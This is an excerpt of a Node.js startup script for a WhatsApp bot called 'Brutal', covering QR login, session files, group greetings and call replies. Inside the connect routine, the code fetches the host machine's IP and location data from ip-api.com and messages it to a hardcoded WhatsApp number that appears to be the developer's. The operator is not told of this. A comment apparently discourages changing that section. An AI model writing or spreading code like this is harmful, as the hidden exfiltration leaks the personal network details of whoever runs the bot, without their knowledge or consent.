...
nocache('./Brutal.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
denz.autoReconnect = ReconnectMode.onConnectionLost
    denz.version = [2, 2119, 6]
    denz.logger.level = 'warn'
    denz.browserDescription = ['Subscribe Brutal','Desktop','3.0']
    await sleep(10000)
    denz.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
    })
    fs.existsSync('./BrutalSession') && denz.loadAuthInfo('./BrutalSession')
  ...
  fs.writeFileSync("./BrutalSession",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 ...
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hi Owner ${settings.NamaBot}, The bot has successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Brutal",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Brutal.jpg'),sourceUrl:"https://wa.me/919101765679?text=Hello"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("919101765679@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Brutal",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Brutal.jpg'),sourceUrl:"https://wa.me/919101765679?text=Hello"}}})
    ...
    //GIVE UP YOU WANT TO CHANGE WHERE
        denz.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			...
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Doge Bot;;;\nFN:Brutal\nitem1.TEL;waid=919101765679:919101765679\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
buttons: gbutsan,
headerType: 4 }
			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./Brutal.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
...
denz.on('CB:action,,call', async json => {
        ...
        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Brutal.jpg'),sourceUrl:`https://wa.me/919101765679?text=Hello bro, i mistakely call the bot`}}})
        await sleep(5000)
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('https://github.com/DGBrutal', 'cyan'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping(' Created By Brutal' ,{ flashStyle: term.brightWhite })
